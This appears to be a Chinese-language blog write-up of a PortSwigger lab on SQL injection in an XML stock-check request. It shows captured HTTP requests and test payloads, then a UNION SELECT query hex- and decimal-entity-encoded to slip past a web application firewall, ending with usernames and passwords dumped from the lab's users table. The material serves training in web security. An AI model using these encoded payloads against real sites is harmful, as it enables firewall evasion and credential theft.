---
layout: post
title: "SQL injection with filter bypass via XML encoding"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection with filter bypass via XML encoding


```

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

#### Hint

A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension to do this.



該實驗室在其庫存檢查功能中包含 [SQL 注入](https://portswigger.net/web-security/sql-injection) 漏洞。 查詢的結果在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。

該數據庫包含一個“用戶”表，其中包含註冊用戶的用戶名和密碼。 要解決實驗室問題，請執行 SQL 注入攻擊以檢索管理員用戶的憑據，然後登錄到他們的帳戶。

＃＃＃＃ 暗示

Web 應用程序防火牆 (WAF) 將阻止包含明顯 SQL 注入攻擊跡象的請求。 您需要找到一種方法來混淆您的惡意查詢以繞過此過濾器。 我們建議使用 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) 擴展來執行此操作。









```




  check stock 抓包:
```http
POST /product/stock HTTP/1.1
Host: 0ab3009d04aec2f9c0ff2c8d00be003c.web-security-academy.net
Cookie: session=0G4VEqc6LLHRdFlR9E9YUFQsM4JOEeQV
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ab3009d04aec2f9c0ff2c8d00be003c.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0ab3009d04aec2f9c0ff2c8d00be003c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3</productId><storeId>3</storeId></stockCheck>


```

看到一段XML 與髮

Lodon paris milan 三個區域按鈕。storeID 分別為 1,2,3
```xml


<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>3</productId>
	<storeId>1</storeId>
</stockCheck>


/////////////////////////////////////////////////////////////

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>3</productId>
	<storeId>2</storeId>
</stockCheck>


/////////////////////////////////////////////////////////////

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>3</productId>
	<storeId>3</storeId>
</stockCheck>

```


測試注入類型，字符型，bool 型。

閉合被WAF 檔了，真實狀況不知道到底是哪種。
```
<storeId>1' union select 123--</storeId>

//"Attack detected"
```


 幸好這題還可以使用bool 注入。 使用1+1 邏輯去跑
```
<storeId>1+1</storeId>

//381 units

```


試試看 union 注入，也被擋了。
```
<storeId>1 UNION SELECT NULL</storeId>

//"Attack detected"
```


所以基本上只能混淆繞過防火牆了。

這邊官方推薦。

## Burpsuite插件之Hackvertor
https://github.com/lilifengcode/Burpsuite-Plugins-Usage/blob/master/Burpsuite%E6%8F%92%E4%BB%B6%E4%B9%8BHackvertor%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.md

符號 || 為串接，把username 和 password 串成同一個欄位。

關方建議使用 dec_entitles 或 hex_entitles 轉譯:

```

<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

dec_entitles:
```
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;
```


hex_entitles:
```xml
<stockCheck>
	<productId>3</productId>
	<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</stockCheck>

```



```
972 units
wiener~k4q7fp1wsy1o459i9bs1
carlos~bzlr55bm0yhj7q2gk3be
administrator~ptpjb8pkvyqo7410xe62
```